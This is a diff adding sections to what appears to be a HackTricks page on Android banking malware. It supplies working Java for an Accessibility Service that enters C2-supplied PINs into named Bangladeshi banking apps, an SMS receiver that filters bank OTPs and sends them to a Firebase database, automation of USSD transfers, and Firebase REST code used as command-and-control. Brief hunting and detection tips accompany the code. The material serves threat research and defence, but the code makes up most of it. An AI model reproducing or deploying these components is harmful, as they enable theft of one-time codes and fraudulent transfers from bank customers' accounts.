@@ -222,11 +222,217 @@ public void onMessageReceived(RemoteMessage msg){
 
 ---
 
+## Accessibility-based ODF: Input Injection against Wallet/Banking Apps
+
+Once a victim enables a rogue Accessibility Service, malware can detect targeted banking apps in the foreground and perform On-Device-Fraud (ODF) by programmatically entering PINs and navigating the UI.
+
+Minimal pattern:
+
+```java
+public class FraudService extends AccessibilityService {
+  private Set<String> targets = new HashSet<>(Arrays.asList(
+      "com.bkash.customerapp", "com.konasl.nagad", "com.dutchbanglabank.mBaking"));
+
+  @Override public void onAccessibilityEvent(AccessibilityEvent e) {
+    if (e.getEventType() == TYPE_WINDOW_STATE_CHANGED || e.getEventType() == TYPE_WINDOW_CONTENT_CHANGED) {
+      CharSequence pkg = e.getPackageName();
+      if (pkg != null && targets.contains(pkg.toString())) {
+        String pin = fetchPinFromC2(); // e.g., Firebase RTDB
+        // Try direct text injection first
+        fillAllEditTexts(pin);
+        // Or fallback to gesture-based keypad tapping
+        typeWithGestures(pin);
+      }
+    }
+  }
+
+  private void fillAllEditTexts(String text){
+    AccessibilityNodeInfo root = getRootInActiveWindow();
+    if (root == null) return;
+    List<AccessibilityNodeInfo> inputs = new ArrayList<>();
+    dfs(root, inputs);
+    for (AccessibilityNodeInfo n : inputs){
+      if (n.isEditable()){
+        Bundle args = new Bundle();
+        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
+        n.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
+      }
+    }
+  }
+
+  private void dfs(AccessibilityNodeInfo n, List<AccessibilityNodeInfo> out){
+    if (n == null) return;
+    if ("android.widget.EditText".contentEquals(n.getClassName())) out.add(n);
+    for (int i=0;i<n.getChildCount();i++) dfs(n.getChild(i), out);
+  }
+
+  private void typeWithGestures(String text){
+    for (char c: text.toCharArray()){
+      PointF p = keypadCoordinateFor(c); // hardcode or learn per target
+      Path path = new Path(); path.moveTo(p.x, p.y);
+      GestureDescription.StrokeDescription s = new GestureDescription.StrokeDescription(path, 0, 40);
+      dispatchGesture(new GestureDescription.Builder().addStroke(s).build(), null, null);
+      SystemClock.sleep(60);
+    }
+  }
+}
+```
+
+For an in-depth primer on abusing Accessibility for remote UI automation and overlays, see:
+
+{{#ref}}
+../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
+{{#endref}}
+
+---
+
+## Targeted SMS/OTP Interception via BroadcastReceiver (Banking Filters)
+
+Banking malware commonly registers an `SMS_RECEIVED` BroadcastReceiver, filters by sender IDs or keywords (bank names), and forwards matching OTPs/alerts to C2.
+
+Manifest:
+
+```xml
+<uses-permission android:name="android.permission.RECEIVE_SMS"/>
+<uses-permission android:name="android.permission.READ_SMS"/>
+
+<receiver android:name=".SmsRx" android:exported="true">
+  <intent-filter>
+    <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+    <action android:name="android.provider.Telephony.SMS_DELIVER"/>
+  </intent-filter>
+</receiver>
+```
+
+Receiver with filters and Firebase RTDB exfiltration:
+
+```java
+public class SmsRx extends BroadcastReceiver {
+  private static final Pattern BANK = Pattern.compile("(?i)(bkash|nagad|mygp|otp|transaction)");
+  private static final Set<String> SENDERS = new HashSet<>(Arrays.asList("16216","26969","009638543210"));
+  private static final String RTDB = "https://<project>.firebaseio.com";
+
+  @Override public void onReceive(Context c, Intent i){
+    for (SmsMessage m: Telephony.Sms.Intents.getMessagesFromIntent(i)){
+      String from = String.valueOf(m.getOriginatingAddress());
+      String body = String.valueOf(m.getMessageBody());
+      if (SENDERS.contains(from) || BANK.matcher(body).find()){
+        JSONObject j = new JSONObject();
+        try{
+          j.put("from", from).put("body", body).put("ts", System.currentTimeMillis());
+        } catch(Exception ignored){}
+        httpPut(RTDB+"/devices/"+deviceId(c)+"/sms/"+System.currentTimeMillis()+".json", j.toString());
+      }
+    }
+  }
+}
+```
+
+Static hunting tip: look for `Telephony.Sms.Intents.getMessagesFromIntent` and hard-coded sender lists / bank-name regexes.
+
+---
+
+## Offline USSD Transaction Automation (No Internet Required)
+
+When a target banking app is not in focus, malware can trigger **USSD sessions** to perform transfers via the mobile operator. This is typically coupled with Accessibility to parse/answer the modal USSD dialogs from the dialer.
+
+Dialling a USSD code and selecting SIM slot:
+
+```java
+// CALL_PHONE permission required
+void dialUssd(Context ctx, String code, int simSlot){
+  Uri uri = Uri.parse("tel:" + Uri.encode(code)); // e.g., *247#
+  TelecomManager tm = (TelecomManager) ctx.getSystemService(Context.TELECOM_SERVICE);
+  List<PhoneAccountHandle> accs = tm.getCallCapablePhoneAccounts();
+  Bundle extras = new Bundle();
+  if (simSlot >= 0 && simSlot < accs.size())
+    extras.putParcelable(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, accs.get(simSlot));
+  tm.placeCall(uri, extras);
+}
+```
+
+Parsing and answering USSD dialogs via Accessibility:
+
+```java
+// In your AccessibilityService
+private void answerUssd(String reply){
+  AccessibilityNodeInfo root = getRootInActiveWindow();
+  if (root == null) return;
+  // Find input
+  List<AccessibilityNodeInfo> edits = root.findAccessibilityNodeInfosByViewId("android:id/input");
+  if (edits.isEmpty()) edits = findByClass(root, "android.widget.EditText");
+  if (!edits.isEmpty()){
+    Bundle b = new Bundle();
+    b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, reply);
+    edits.get(0).performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
+  }
+  // Click SEND / OK
+  for (String label: Arrays.asList("SEND","Send","send","OK","Ok","ok")){
+    List<AccessibilityNodeInfo> btns = root.findAccessibilityNodeInfosByText(label);
+    for (AccessibilityNodeInfo n: btns){ n.performAction(AccessibilityNodeInfo.ACTION_CLICK); }
+  }
+}
+
+private List<AccessibilityNodeInfo> findByClass(AccessibilityNodeInfo n, String cls){
+  List<AccessibilityNodeInfo> out = new ArrayList<>();
+  if (n == null) return out;
+  if (cls.contentEquals(n.getClassName())) out.add(n);
+  for (int i=0;i<n.getChildCount();i++) out.addAll(findByClass(n.getChild(i), cls));
+  return out;
+}
+```
+
+Hunting patterns:
+- `TelecomManager.placeCall` with `Uri.encode("*"...)` and `EXTRA_PHONE_ACCOUNT_HANDLE` for SIM selection
+- Accessibility searches for dialog text + button labels `SEND|OK` and `ACTION_SET_TEXT` on `EditText`
+
+---
+
+## Firebase Realtime Database (RTDB) as C2 and Data Store
+
+Instead of a custom backend, many mobile crews rely on **Firebase Realtime Database** for both exfiltration and tasking. RTDB blends with legitimate Google traffic and offers simple **REST endpoints**.
+
+Minimal REST usage with OkHttp:
+
+```java
+// write data
+void rtdbPut(String base, String path, JSONObject obj){
+  Request r = new Request.Builder()
+      .url(base + path + ".json") // e.g., https://<proj>.firebaseio.com/devices/<id>/tasks.json
+      .put(RequestBody.create(obj.toString(), MediaType.get("application/json")))
+      .build();
+  client.newCall(r).execute();
+}
+
+// poll for commands
+JSONObject rtdbGet(String base, String path){
+  Request r = new Request.Builder().url(base + path + ".json").get().build();
+  Response resp = client.newCall(r).execute();
+  return new JSONObject(resp.body().string());
+}
+```
+
+Notes
+- Public RTDBs (rules set to `true`) require no auth; otherwise add `?auth=<idToken>`.
+- For near real-time tasking without FCM, use the REST streaming API (`Accept: text/event-stream`) on `<path>.json` to receive `put`/`patch` events.
+- Common paths: `/devices/<android_id>/sms`, `/devices/<id>/pii`, `/tasks/<id>` with fields like `{ "ussd": "*247*1*<num>#", "sim": 0, "pin": "1234" }`.
+
+Detection ideas
+- Alert on `*.firebaseio.com` writes from unknown apps; inspect payload structure for device identifiers.
+- Blocklist known project IDs seen in malware; monitor REST streaming connections.
+
+---
+
 ## References
 
 - [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
 - [Luban – Android image compression library](https://github.com/Curzibn/Luban)
 - [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
 - [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
+- [SikkahBot Malware Campaign Lures and Defrauds Students in Bangladesh (Cyble CRIL)](https://cyble.com/blog/sikkahbot-malware-defrauds-students-in-bangladesh/)
+- [Firebase Realtime Database — REST API](https://firebase.google.com/docs/database/rest/start)
+- [Android AccessibilityService — Guide](https://developer.android.com/guide/topics/ui/accessibility/service)
+- [Android Telephony — SMS Intents](https://developer.android.com/reference/android/provider/Telephony.Sms.Intents)
+- [Android TelecomManager — placeCall](https://developer.android.com/reference/android/telecom/TelecomManager#placeCall(android.net.Uri,%20android.os.Bundle))
 
 {{#include ../../banners/hacktricks-training.md}}
